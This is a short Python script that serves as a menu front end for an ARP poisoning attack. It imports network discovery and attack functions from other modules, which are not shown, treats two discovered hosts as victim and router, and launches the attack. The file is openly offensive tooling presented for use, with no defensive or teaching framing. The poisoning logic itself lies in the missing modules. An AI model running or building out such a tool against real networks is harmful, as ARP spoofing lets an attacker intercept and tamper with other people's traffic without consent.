import os

def main():
    from discovery import start_discovery
    from ARP import start_attack
    while True:
        os.system("clear")
        print("1: Start ARP poisoning attack")
        print("2: Quit")

        print()
        choice = input("Press a number: ")

        if choice == "1":
            victims, interface, self_ip, self_mac = start_discovery()
            if len(victims) < 2:
                input("Not enough victims returned...")
            else:
                input("Do the ARP attack...")
                victim_ip, victim_mac = victims[0]
                router_ip, router_mac = victims[1]
                start_attack(victim_ip, victim_mac, router_ip, router_mac, self_ip, self_mac, interface)
        elif choice == "2":
            break

if __name__ == "__main__":
    main()